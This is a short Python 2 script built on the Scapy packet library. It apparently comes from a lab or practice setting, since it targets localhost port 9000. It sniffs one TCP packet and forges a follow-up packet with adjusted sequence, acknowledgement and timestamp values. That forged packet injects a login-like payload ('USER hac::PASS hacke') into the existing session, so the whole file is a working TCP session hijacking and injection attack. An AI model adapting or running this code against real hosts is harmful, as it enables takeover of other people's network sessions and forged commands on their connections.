from scapy.all import *
import time

sip = '127.0.0.1'
dip = '127.0.0.1'
port = '9000'
filter = 'host ' + sip + ' and port ' + port

def hijack(p):
    conf.L3socket = L3RawSocket
    if p[IP].src == sip and p[IP].dst == dip:
        time.sleep(2)
        print "Seq: " + str(p[TCP].seq) + " | Ack: " + str(p[TCP].ack)
        print "Hijack Seq: " + str(p[TCP].ack) + " | Hijack Ack: " + str(p[TCP].seq)
        #ether = Ether(dst=p[Ether].dst, src=p[Ether].src)
        ip = IP(src=p[IP].src, dst=p[IP].dst, ihl=p[IP].ihl, len=p[IP].len, flags=p[IP].flags, frag=p[IP].frag, ttl=p[IP].ttl, proto=p[IP].proto, id=p[IP].id+1, chksum=p[IP].chksum-1)
        tsval = p[TCP].options[2][1][0]+251
        tsecr = p[TCP].options[2][1][1]+250
        tcp = TCP(sport=p[TCP].sport, dport=p[TCP].dport, seq=p[TCP].seq+23, ack=p[TCP].ack, dataofs=p[TCP].dataofs, reserved=p[TCP].reserved, flags="PA", window=p[TCP].window, options=TCP(str(TCP(options=[('NOP', None), ('NOP', None), ('Timestamp', (tsval, tsecr))]))).options)
        raw = Raw(load=p[Raw].load)
        hijack = ip/tcp/(b'\x82\x15USER hac::PASS hacke\n')
        #hijack = ip/tcp/raw
        print p.show()
        print hijack.show()
        rcv = sendp(hijack)

sniff(count=1, prn = lambda p: hijack(p), filter=filter, lfilter=lambda(f): f.haslayer(IP) and f.haslayer(TCP) and f.haslayer(Ether) and f.haslayer(Raw))
